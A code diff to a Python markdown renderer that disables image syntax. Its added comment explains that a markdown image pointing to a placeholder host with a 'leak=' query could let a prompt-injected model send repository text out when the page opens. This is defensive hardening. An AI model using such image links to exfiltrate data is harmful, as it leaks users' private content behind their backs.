@@ -11,9 +11,12 @@ import os
 
 from markdown_it import MarkdownIt
 
+# coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
+# live <img> that fires on page open, an egress channel from repo text via
+# a prompt-injected model. html=False does not cover it.
 _MD = MarkdownIt(
     "commonmark", {"html": False, "linkify": True, "breaks": False}
-).enable(["table"])
+).enable(["table"]).disable("image")
 
 
 def md(text):
